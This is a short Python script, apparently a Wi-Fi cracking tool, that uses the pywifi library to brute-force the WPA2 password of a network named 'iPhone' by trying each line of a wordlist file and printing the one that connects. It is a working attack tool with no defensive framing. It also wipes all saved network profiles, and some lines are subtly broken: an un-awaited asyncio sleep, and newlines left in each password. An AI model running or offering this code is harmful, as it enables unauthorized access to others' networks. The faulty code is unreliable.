# @ Author  : JuRan
# @ 微信     : logic_juran
# @ QQ      : 2705185834


import time  #时间
import pywifi  #破解wifi
from pywifi import const  #引用一些定义
from asyncio.tasks import sleep




class PoJie():
    def __init__(self,path):
        self.file=open(path,"r",errors="ignore")
        # 抓取网卡接口
        wifi = pywifi.PyWiFi()
        # 抓取第一个无限网卡
        self.iface = wifi.interfaces()[0]
        # 测试链接断开所有链接
        self.iface.disconnect()
        # 休眠1秒
        time.sleep(1)

        #测试网卡是否属于断开状态，
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def readPassWord(self):
            print("开始破解：")
            while True:
                try:
                    myStr =self.file.readline()
                    if not myStr:
                        break
                    bool1=self.test_connect(myStr)
                    if bool1:
                        print("密码正确：",myStr)
                        break
                    else:
                        print("密码错误:"+myStr)
                    sleep(3)
                except:
                    continue

    # 测试链接
    def test_connect(self,findStr):
        # 创建wifi链接文件
        profile = pywifi.Profile()
        # wifi名称
        profile.ssid ="iPhone"
        # 网卡的开放，
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 密码
        profile.key = findStr
        # 删除所有的wifi文件
        self.iface.remove_all_network_profiles()
        # 设定新的链接文件
        tmp_profile = self.iface.add_network_profile(profile)
        # 链接
        self.iface.connect(tmp_profile)
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True
        else:
            isOK=False
        # 断开
        self.iface.disconnect()
        time.sleep(1)
        #检查断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOK


    def __del__(self):
        self.file.close()

path=r"filepath"
start=PoJie(path)
start.readPassWord()